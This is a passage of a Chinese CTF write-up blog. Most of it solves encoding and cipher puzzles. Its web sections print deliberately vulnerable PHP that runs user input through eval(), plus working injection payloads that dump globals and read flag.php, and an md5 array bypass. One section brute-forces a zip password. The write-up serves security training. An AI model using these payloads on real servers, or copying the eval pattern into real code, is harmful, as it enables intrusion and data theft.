class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">方方格格，不断敲击</span><br><span class="line">“wdvtdz  qsxdr werdzxc  esxcfr uygbn”</span><br><span class="line">flag格式为：flag&#123;小写的字符串&#125;</span><br></pre></td></tr></table></figure></p><h2 id="签到题3"><a href="#签到题3" class="headerlink" title="签到题3"></a>签到题3</h2><p>MD5解密一下得到flag<br><a href="https://www.somd5.com/" target="_blank" rel="noopener">解密地址</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">21232f297a57a5a743894a0e4a801fc3</span><br><span class="line"></span><br><span class="line">flag&#123;admin&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小常识"><a href="#小常识" class="headerlink" title="小常识"></a>小常识</h2><p>这个知识点不是很了解QWQ<br><img src="/2018/03/08/i春秋-CTF训练大本营题解/xiaochangsi.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">低频ID卡数据格式转换小常识</span><br><span class="line">将下列16进制串中倒数第5，6位转换为3位十进制数，</span><br><span class="line">将最后4位转换为5位十进制卡号，中间用“，”分开。</span><br><span class="line">0 0 0 0 94 4664</span><br><span class="line"></span><br><span class="line">94 = 148</span><br><span class="line">4664 = 18020</span><br><span class="line">（用计算机进制转换得出）</span><br><span class="line"></span><br><span class="line">flag&#123;148,18020&#125;</span><br></pre></td></tr></table></figure></p><h2 id="回归原始"><a href="#回归原始" class="headerlink" title="回归原始"></a>回归原始</h2><p>应该是二进制转化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">让我们回到最开始的地方</span><br><span class="line">011001100110110001100001011001110111101101100011011001010011001101100101001101010011000000110010011000110010110100110100001110000110001100111001001011010011010001100100001101010011000000101101001110010011100100111001001100000010110100110101011000100011100000110001011001000110001000110110011001100110001101100010011001100011000001111101</span><br><span class="line"></span><br><span class="line">f l a g &#123; c e 3 e 5 0 2 c - 4 8 c 9 - 4 d 5 0 - 9 9 9 0 - 5 b 8 1 d b 6 f c b f 0 &#125;</span><br><span class="line">flag&#123;ce3e502c-48c9-4d50-9990-5b81db6fcbf0&#125;</span><br></pre></td></tr></table></figure></p><h2 id="一个十六岁的少年"><a href="#一个十六岁的少年" class="headerlink" title="一个十六岁的少年"></a>一个十六岁的少年</h2><p>很容易想到base16加密。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">有一天，表姐的好朋友贝丝远房的表亲，一个16岁的少年</span><br><span class="line">给表姐递了一封情书，表姐看不懂，你能帮忙翻译下吗？</span><br><span class="line">666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; decode = base64.b16decode(b&apos;666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D&apos;)</span><br><span class="line">&gt;&gt;&gt; decode</span><br><span class="line">b&apos;flag&#123;ec8b2ee0-3ae9-4c21-a012-08aa5fa7be67&#125;&apos;</span><br></pre></td></tr></table></figure></p><h2 id="——"><a href="#——" class="headerlink" title="+——+"></a>+——+</h2><p>Brainfuck编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">题目内容：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- --.+. ----- -.&lt;++</span><br><span class="line">+++++ [-&gt;++ +++++ &lt;]&gt;++ ++.-- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- .----</span><br><span class="line">--.++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; --.++ +++.+ +++.- .&lt;+++ +++[- &gt;++++ ++&lt;]&gt;</span><br><span class="line">+++++ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ---.+ +++++ +.+++ ++.-- ----- .&lt;+++</span><br><span class="line">++++[ -&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- .&lt;+++ ++++[</span><br><span class="line">-&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;.++ ++.-- -.--- -.&lt;++ +++++</span><br><span class="line">[-&gt;++ +++++ &lt;]&gt;++ ++.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- ---.- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ..&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.-- -.+.+ ++.-- ---.+</span><br><span class="line">++++. ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;</span><br></pre></td></tr></table></figure></p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">解密地址</a></p><h2 id="福尔摩斯"><a href="#福尔摩斯" class="headerlink" title="福尔摩斯"></a>福尔摩斯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">贝克街旁的圆形广场</span><br><span class="line">·-· ·-· ·-· ·-· ·-· ·-· ·</span><br><span class="line">flag格式：flag&#123;*********&#125;</span><br></pre></td></tr></table></figure><p>摩斯电码，和对照表对比一下得到flag</p><h2 id="misc1-纵横四海"><a href="#misc1-纵横四海" class="headerlink" title="misc1-纵横四海"></a>misc1-纵横四海</h2><p>题目提示分久必合合久必分，所以把压缩包里面每个文件的内容拼接起来就是flag<br>这种排序第一次看到，当然也可以用python来解决。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//windows下命令行</span><br><span class="line">**&gt; cd tiaoxiwoya</span><br><span class="line">**&gt; type dabiaojie* &gt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">flag&#123;0a47061d-0619-4932-abcd-5426f4ea34aa&#125;fjicjeowqkfoqwjfoqf</span><br></pre></td></tr></table></figure></p><h2 id="常在邮件头里的秘密"><a href="#常在邮件头里的秘密" class="headerlink" title="常在邮件头里的秘密"></a>常在邮件头里的秘密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">flag&#123;ichunqiu_=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6&#125;</span><br></pre></td></tr></table></figure><p>没接触过这个编码，所以参考了一下wp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">曾接触过类似特征的编码，判断为可打印字符编码(Quoted_Printable),在线解码即得到flag</span><br><span class="line"></span><br><span class="line">在所有邮件处理的各式各样的编码中，很多编码的目的都是通过编码手段使 得七位字符的邮件协议体系可以传送八位的二进制文件、双字节语言文字等等。 Quoted-Printable也是这样一些编码中的一个， 它的目的同样是帮助非ASCII 编码的信件传输通过 SMTP。Quoted-Printable 编码是字符对应的编码，每个未 编码的二进制字符被编码成三个字符，即一个等号和一个十六进制的数字，如“=A8”。 </span><br><span class="line">Quoted-Printable编码的源码样式如下: =D4=DA=CB=F9=D3=D0=D3=CA=BC=FE=B4=A6=C0=ED……</span><br></pre></td></tr></table></figure></p><p><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">解密地址</a></p><h2 id="吃货"><a href="#吃货" class="headerlink" title="吃货"></a>吃货</h2><p>一看到题目就想到培根密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">麻辣烫的标配</span><br><span class="line">flag&#123;abbab_babbb_baaaa_aaabb&#125;</span><br><span class="line"></span><br><span class="line">培根密码中的ab,代表的是数学二进制中的0和1.</span><br><span class="line">通过下列的密码表进行加密和解密：</span><br><span class="line">第一种方式：</span><br><span class="line">A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab</span><br><span class="line">K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb</span><br><span class="line">U babaa V babab W babba X babbb Y bbaaa Z bbaab</span><br><span class="line">第二种方式</span><br><span class="line">a AAAAA g AABBA n ABBAA t BAABA</span><br><span class="line">b AAAAB h AABBB o ABBAB u-v BAABB</span><br><span class="line">c AAABA i-j ABAAA p ABBBA w BABAA</span><br><span class="line">d AAABB k ABAAB q ABBBB x BABAB</span><br><span class="line">e AABAA l ABABA r BAAAA y BABBA</span><br><span class="line">f AABAB m ABABB s BAAAB z BABBB</span><br></pre></td></tr></table></figure></p><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>1、binwalk 没东西<br>2、图像分析 没结果<br>3、winhex  flag在底部</p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>给了一张图片<br><img src="/2018/03/08/i春秋-CTF训练大本营题解/zhujuan.png" alt=""><br>以为是隐写，浪费了好多时间没做出来，后面看了官方的WP才知道是<a href="https://baike.so.com/doc/5399490-5636999.html" target="_blank" rel="noopener">猪圈密码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;NSN&#125;</span><br></pre></td></tr></table></figure></p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>百度一下<a href="http://blog.sina.com.cn/s/blog_6cb46cbd0100z5dt.html" target="_blank" rel="noopener">键盘坐标密码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">哒哒哒哒，你知道什么是键盘坐标密码吗？</span><br><span class="line">11 21 31 18 27 33 34</span><br><span class="line">flag格式：flag&#123;*****&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">什么是键盘坐标密码：</span><br><span class="line"></span><br><span class="line">我们注意到大键盘区所有的字母上面都有其对应的数字，这个位置几乎在所有的键盘都是相同的。所以我们可以利用这一点应用单表替换的方法进行加密[注2]：</span><br><span class="line"></span><br><span class="line">1 2 3 4 5 6 7 8 9 0</span><br><span class="line"></span><br><span class="line">Q W E R T Y U I O P</span><br><span class="line"></span><br><span class="line">A S D F G H J K L</span><br><span class="line"></span><br><span class="line">Z X C V B N M</span><br><span class="line"></span><br><span class="line">我们根据上表可以得出，Q是1下面的第一个，A是1下面的第二个……以此类推，每一个字母都会有其对应的数字：</span><br><span class="line">A 12                B 53               C 33</span><br><span class="line"></span><br><span class="line">第一个数字代表横向（X坐标）的位置，第二个数字代表纵向（Y坐标）的位置</span><br><span class="line"></span><br><span class="line">就可以得到最后的答案：flag&#123;QAZIJ**&#125;</span><br><span class="line">QAZIJCV</span><br><span class="line">flag&#123;*********&#125;</span><br></pre></td></tr></table></figure></p><h2 id="听说是rc4算法"><a href="#听说是rc4算法" class="headerlink" title="听说是rc4算法"></a>听说是rc4算法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">key welcometoicqedu </span><br><span class="line">密文UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw==</span><br></pre></td></tr></table></figure><p>这里参考了<a href="http://www.bubuko.com/infodetail-1930248.html" target="_blank" rel="noopener">这篇文章</a><br>python脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import random, base64  </span><br><span class="line">from hashlib import sha1  </span><br><span class="line">      </span><br><span class="line">def crypt(data, key):  </span><br><span class="line">    x = 0  </span><br><span class="line">    box = range(256)  </span><br><span class="line">    for i in range(256):  </span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % 256  </span><br><span class="line">        box[i], box[x] = box[x], box[i]  </span><br><span class="line">    x = y = 0  </span><br><span class="line">    out = []  </span><br><span class="line">    for char in data:  </span><br><span class="line">        x = (x + 1) % 256  </span><br><span class="line">        y = (y + box[x]) % 256  </span><br><span class="line">        box[x], box[y] = box[y], box[x]  </span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))        </span><br><span class="line">    return ‘‘.join(out)    </span><br><span class="line"></span><br><span class="line">def tdecode(data, key, decode=base64.b64decode, salt_length=16):  </span><br><span class="line">    if decode:  </span><br><span class="line">        data = decode(data)</span><br><span class="line">    salt = data[:salt_length]    </span><br><span class="line">    return crypt(data[salt_length:], sha1(key + salt).digest())  </span><br><span class="line">            </span><br><span class="line">if __name__==‘__main__‘:  </span><br><span class="line">    data = ‘UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw==‘    </span><br><span class="line">    key = ‘welcometoicqedu‘    </span><br><span class="line">    decoded_data = tdecode(data=data, key=key)  </span><br><span class="line">    print decoded_data</span><br></pre></td></tr></table></figure></p><h2 id="传说中的签到题"><a href="#传说中的签到题" class="headerlink" title="传说中的签到题"></a>传说中的签到题</h2><p>纯脑洞题，被秀的不要不要的啊啊啊啊啊啊阿好像打出题人QAQ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">小编保证这次是正常的签到题。</span><br><span class="line">按例，继续调戏小i公众号</span><br><span class="line">输入关键词“答案在哪里”</span><br><span class="line">就能获得你想要的。</span><br><span class="line">诺！扫码直接关注</span><br></pre></td></tr></table></figure></p><p>1、去公众号回复发现没有什么突破口<br>2、扫描二维码 发现一些文字<br>“就算你发现我但是知道flag是什么??”<br>所以flag就是 <code>什么</code></p><h2 id="misc2-对错"><a href="#misc2-对错" class="headerlink" title="misc2-对错"></a>misc2-对错</h2><p>直接进制转换得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01100110 01101100 01100001 01100111 01111011 01111010 01101000 01000101 01100011 00111001 00110000 00110011 00110100 01101010 01101111 01100100 01110011 01101010 01100110 01101111 01110011 01101011 01101111 01111101</span><br><span class="line"></span><br><span class="line">f l a g &#123; z h E c 9 0 3 4 j o d s j f o s k o &#125;</span><br></pre></td></tr></table></figure></p><h2 id="misc3-枯竭"><a href="#misc3-枯竭" class="headerlink" title="misc3-枯竭"></a>misc3-枯竭</h2><p>得到一个压缩包<br>1、文件头好像不对，修复了一下，还是打不开；<br>2、试了一下伪加密，还是打不开；<br>3、那就只能暴力破解了，选择数字先爆破一下，得到密码为12345<br>解压得到flag。</p><h2 id="misc1-祸起北荒"><a href="#misc1-祸起北荒" class="headerlink" title="misc1 祸起北荒"></a>misc1 祸起北荒</h2><p>题目讲了很多,重点还是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一层虚数空间是需要与一个上古神器“i春秋”进行智能比拼，获取开启第一层虚数空间的flag</span><br><span class="line"></span><br><span class="line">启动法诀： 元宵节百度杯与红包更加搭配哟！</span><br></pre></td></tr></table></figure></p><p>应该又是脑洞题，乖乖去调戏公众号就能得到flag。</p><h2 id="misc2-上古神器"><a href="#misc2-上古神器" class="headerlink" title="misc2 上古神器"></a>misc2 上古神器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.......但是你需要帮助我将这个波斯传来的“波利比奥斯棋盘”上的秘密解决掉 </span><br><span class="line">华夜拿到该棋盘，只见棋盘盒上分布着一串十分奇异的数字：</span><br><span class="line">“3534315412244543_434145114215_132435231542”</span><br><span class="line">华夜微微思量，只见他大袖一会，手上立马变出一个计算器，瘦削的指尖快速的点击</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>根据提示知道这应该是<a href="https://baike.so.com/doc/25753598-26887523.html" target="_blank" rel="noopener">波利比奥斯棋盘密码</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">35 34 31 54 12 24 45 43 _ 43 41 45 11 42 15 _ 13 24 35 23 15 42</span><br><span class="line"></span><br><span class="line">polyb i/j us_square_c i/j pher</span><br><span class="line"></span><br><span class="line">flag&#123;polybius_square_cipher&#125;</span><br></pre></td></tr></table></figure><h2 id="misc3-此去经年"><a href="#misc3-此去经年" class="headerlink" title="misc3 此去经年"></a>misc3 此去经年</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">第三层虚数空间是由一位已经陨落的上古剑圣--独孤求败一手创立的，据说这位上古大神痴迷诗词，其中最爱的便是一首解谜诗</span><br><span class="line">原本有心花不开</span><br><span class="line">偶尔有人来相伴</span><br><span class="line">悔时无心已有泪</span><br><span class="line">吞下口去悄无声</span><br><span class="line">来者耳边轻轻诉</span><br><span class="line">缺少左边心相印</span><br><span class="line">东风带走一二点</span><br><span class="line">一生只败在了两件事上，第一件事是这首解谜诗</span><br><span class="line">另外一件事是，没有动用丝毫武力便败给了劲敌东方不败</span><br><span class="line">失败的原因没能填满东方不败出的一首诗句</span><br><span class="line">他将这首残诗刻在了通往第四层虚数空间的通关法诀上</span><br><span class="line">只有填满句诗词，才能走出这层虚数空间</span><br><span class="line">5LiD5pyI5Zyo6YeOICA=</span><br><span class="line">5YWr5pyI5Zyo5a6HIA==</span><br><span class="line">5Lmd5pyI5Zyo5oi3</span><br><span class="line">tips：比赛结束，已无红包活动</span><br><span class="line">flag格式：flag&#123;*****&#125;</span><br></pre></td></tr></table></figure><p>关键在于:<br><code>5LiD5pyI5Zyo6YeOICA=</code><br><code>5YWr5pyI5Zyo5a6HIA==</code><br><code>5Lmd5pyI5Zyo5oi3</code><br>这里用<a href="http://web.chacuo.net/charsetbase64" target="_blank" rel="noopener">base64（utf8编码（UNICode编码））</a>解出来没有乱码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">七月在野  八月在宇  九月在户</span><br><span class="line"></span><br><span class="line">百度一下发现:</span><br><span class="line">《豳风.七月》是《诗经》中最典型的农业生活诗，是风诗中最长的一篇，88句，380字。在艺术上也是“三百篇”中比较突出的一篇。</span><br><span class="line"></span><br><span class="line"> 七月在野:七月蟋蟀野地鸣;八月在宇:八月屋檐底下唱;九月在户:九月跳进房门槛;十月蟋蟀入我床下:十月到我床下藏;</span><br><span class="line"></span><br><span class="line"> 所以 flag&#123;十月蟋蟀入我床下&#125;</span><br></pre></td></tr></table></figure></p><h2 id="misc-web爆破-1"><a href="#misc-web爆破-1" class="headerlink" title="misc web爆破-1"></a>misc web爆破-1</h2><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$a = @$_REQUEST[&apos;hello&apos;];</span><br><span class="line">if(!preg_match(&apos;/^\w*$/&apos;,$a ))&#123;</span><br><span class="line">  die(&apos;ERROR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">eval(&quot;var_dump($$a);&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>题目给了源码，想到爆破出所有变量，于是直接 ?hello=GLOBALS   把所有变量都 dump 出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(9) &#123; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;hello&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(9) &#123; [&quot;pgv_pvi&quot;]=&gt; string(10) &quot;2802929664&quot; [&quot;chkphone&quot;]=&gt; string(33) &quot;acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O&quot; [&quot;UM_distinctid&quot;]=&gt; string(60) &quot;16176885763527-0f2c301dba1077-5d4e211f-1fa400-16176885764384&quot; [&quot;Hm_lvt_9104989ce242a8e03049eaceca950328&quot;]=&gt; string(21) &quot;1519914875,1520501772&quot; [&quot;Hm_lvt_1a32f7c660491887db0960e9c314b022&quot;]=&gt; string(21) &quot;1519914875,1520501772&quot; [&quot;pgv_si&quot;]=&gt; string(10) &quot;s478899200&quot; [&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;]=&gt; string(43) &quot;1520501368,1520574774,1520575056,1520575073&quot; [&quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;]=&gt; string(10) &quot;1520579191&quot; [&quot;ci_session&quot;]=&gt; string(40) &quot;553fee565b59e375b93043b3adf8995c062b6d42&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;_REQUEST&quot;]=&gt; array(1) &#123; [&quot;hello&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;flag&quot;]=&gt; string(38) &quot;flag在一个长度为6的变量里面&quot; [&quot;d3f0f8&quot;]=&gt; string(42) &quot;flag&#123;749acbfa-62f1-482c-a2f4-52f1f7e02030&#125;&quot; [&quot;a&quot;]=&gt; string(7) &quot;GLOBALS&quot; [&quot;GLOBALS&quot;]=&gt; *RECURSION*</span><br></pre></td></tr></table></figure></p><h2 id="misc-web爆破-2"><a href="#misc-web爆破-2" class="headerlink" title="misc web爆破-2"></a>misc web爆破-2</h2><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$a = @$_REQUEST[&apos;hello&apos;];</span><br><span class="line">eval( &quot;var_dump($a);&quot;);</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure></p><p>构造paylaod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://360a4885832d4a96988832fc3632eead954c62591b3c45a9.game.ichunqiu.com/?hello=file_get_contents(&apos;flag.php&apos;)</span><br><span class="line"></span><br><span class="line">flag在源代码里找到QWQ</span><br><span class="line"></span><br><span class="line">string(83) &quot;&lt;?php</span><br><span class="line">$flag = &apos;Too Young Too Simple&apos;;</span><br><span class="line">#flag&#123;80dbae50-0a97-467f-98c5-3dc638c9a8ed&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="misc-web爆破-3"><a href="#misc-web爆破-3" class="headerlink" title="misc web爆破-3"></a>misc web爆破-3</h2><p>又是源码审计，源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require(&apos;./flag.php&apos;);</span><br><span class="line">if(!isset($_SESSION[&apos;nums&apos;]))&#123;</span><br><span class="line">  $_SESSION[&apos;nums&apos;] = 0;</span><br><span class="line">  $_SESSION[&apos;time&apos;] = time();</span><br><span class="line">  $_SESSION[&apos;whoami&apos;] = &apos;ea&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&apos;time&apos;]+120&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[&apos;value&apos;];</span><br><span class="line">$str_rand = range(&apos;a&apos;, &apos;z&apos;);</span><br><span class="line">$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];</span><br><span class="line"></span><br><span class="line">if($_SESSION[&apos;whoami&apos;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;</span><br><span class="line">  $_SESSION[&apos;nums&apos;]++;</span><br><span class="line">  $_SESSION[&apos;whoami&apos;] = $str_rands;</span><br><span class="line">  echo $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&apos;nums&apos;]&gt;=10)&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过<br>substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag<br>参考了<a href="https://www.ichunqiu.com/writeup/detail/721" target="_blank" 